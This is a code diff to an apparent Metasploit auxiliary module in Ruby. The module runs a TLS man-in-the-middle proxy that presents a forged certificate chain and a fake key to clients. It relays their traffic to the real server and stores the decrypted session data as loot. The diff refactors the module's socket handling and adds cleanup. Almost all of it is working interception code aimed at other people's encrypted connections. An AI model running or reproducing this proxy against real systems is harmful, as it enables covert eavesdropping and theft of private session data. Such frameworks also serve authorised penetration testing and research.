@@ -67,6 +67,21 @@ class Metasploit3 < Msf::Auxiliary
       ], self.class)
   end
 
+  def cleanup
+    super
+    return unless @proxy
+
+    begin
+      @proxy.deref if @proxy.kind_of?(Rex::Service)
+      if @proxy.kind_of?(Rex::Socket)
+        @proxy.close
+        @proxy.stop
+      end
+      @proxy = nil
+    rescue ::Exception
+    end
+  end
+
   def run
     host = datastore['HOST']
     port = datastore['PORT']
@@ -132,17 +147,25 @@ class Metasploit3 < Msf::Auxiliary
     context.extra_chain_cert = [leaf_cert, subinter_ca_cert]
     context.key = fake_key
 
-    tcp_server = TCPServer.new(local_host, local_port)
-    proxy = OpenSSL::SSL::SSLServer.new(tcp_server, context)
-    print_status('Listening on %s:%d' % [proxy.addr[2], proxy.addr[1]])
+    @proxy = Rex::Socket::SslTcpServer.create(
+      'LocalHost' => local_host,
+      'LocalPort' => local_port,
+      'SSLContext' => context,
+      'Context'   =>
+        {
+          'Msf'        => framework,
+          'MsfExploit' => self
+        })
+
+    print_status('Listening on %s:%d' % [local_host, local_port])
 
     thread_num = 0
 
     loop do
-      framework.threads.spawn("Thread #{thread_num += 1}", false, proxy.accept) do |client|
+      framework.threads.spawn("Thread #{thread_num += 1}", false, @proxy.accept) do |client|
+        add_socket(client)
         application_data = ''
-
-        print_status('Accepted connection from %s:%d' % [client.addr[2], client.addr[1]])
+        print_status('Accepted connection from %s:%d' % [client.peerhost, client.peerport])
 
         server = Rex::Socket::Tcp.create(
           'PeerHost' => host,
@@ -154,6 +177,7 @@ class Metasploit3 < Msf::Auxiliary
               'Msf'        => framework,
               'MsfExploit' => self
             })
+        add_socket(server)
 
         print_status('Connected to %s:%d' % [host, port])
 
@@ -162,20 +186,17 @@ class Metasploit3 < Msf::Auxiliary
             readable, _, _ = IO.select([client, server])
 
             readable.each do |r|
-              data = r.readpartial(4096)
+              data = r.get_once
               print_status('%d bytes received' % [data.bytesize])
 
               application_data << data
 
               case r
               when client
-                count = server.write(data)
-                server.flush
+                count = server.put(data)
                 print_status('%d bytes sent' % [count])
-
               when server
-                count = client.write(data)
-                client.flush
+                count = client.put(data)
                 print_status('%d bytes sent' % [count])
               end
             end
@@ -185,7 +206,7 @@ class Metasploit3 < Msf::Auxiliary
           path = store_loot(
             'tls.application_data',
             'application/octet-stream',
-            client.addr[2],
+            client.peerhost,
             application_data,
             'application_data',
             'TLS session application data'
@@ -203,8 +224,6 @@ class Metasploit3 < Msf::Auxiliary
         server.close
       end
     end
-
-    proxy.close
   end
 
 end
